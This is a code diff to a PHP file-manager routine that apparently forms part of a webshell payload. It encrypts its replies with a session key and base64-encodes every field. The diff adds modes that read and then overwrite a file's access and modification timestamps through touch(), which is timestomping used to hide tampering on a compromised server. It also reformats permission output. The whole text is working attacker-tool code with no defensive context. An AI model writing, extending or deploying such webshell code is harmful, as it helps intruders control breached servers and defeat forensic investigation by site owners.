@@ -32,7 +32,7 @@ function delDir($dir)
     return rmdir($dir);
 }
 
-function main($mode, $path = ".", $content = "", $charset = "",$newpath="")
+function main($mode, $path = ".", $content = "", $charset = "",$newpath="",$createTimeStamp="",$accessTimeStamp="",$modifyTimeStamp="")
 {
 	//$path=getgbkStr($path);
 	$path=getSafeStr($path);
@@ -58,7 +58,7 @@ function main($mode, $path = ".", $content = "", $charset = "",$newpath="")
                     "size" => base64_encode(filesize($fullPath)),
                     "lastModified" => base64_encode(date("Y-m-d H:i:s", filemtime($fullPath)))
                 );
-                $obj["perm"] = is_readable($fullPath) . "," . is_writable($fullPath) . "," . is_executable($fullPath);
+                $obj["perm"] = base64_encode((is_readable($fullPath)?"R":"-") . "/" . (is_writable($fullPath)?"W":"-" ). "/" . (is_executable($fullPath)?"E":"-"));
                 if (is_file($fullPath)) {
                     $obj["type"] = base64_encode("file");
                 } else {
@@ -103,6 +103,29 @@ function main($mode, $path = ".", $content = "", $charset = "",$newpath="")
             }
             $result = encrypt(json_encode($result),$_SESSION['k']);
             echo $result;
+            break;
+        case "getTimeStamp":
+            $result["status"] = base64_encode("success");
+            $timeStampObj = array(
+                                "createTime" => base64_encode(date("Y/m/d H:i:s", filectime ($path))),
+                                "lastAccessTime" => base64_encode(date("Y/m/d H:i:s", fileatime ($path))),
+                                "lastModifiedTime" =>base64_encode(date("Y/m/d H:i:s", filemtime ($path)))
+                            );
+            $result["msg"] = base64_encode(json_encode($timeStampObj));
+            echo encrypt(json_encode($result), $_SESSION['k']);
+            break;
+        case "updateTimeStamp":
+            if (touch ($path , strtotime($modifyTimeStamp) ,strtotime($accessTimeStamp)))
+            {
+            $result["status"] = base64_encode("success");
+            $result["msg"] = base64_encode("时间戳修改成功。");
+            }
+            else
+            {
+            $result["status"] = base64_encode("fail");
+            $result["msg"] = base64_encode("时间戳修改失败。");
+            }
+            echo encrypt(json_encode($result), $_SESSION['k']);
             break;
         case "download":
             if (! file_exists($path)) {
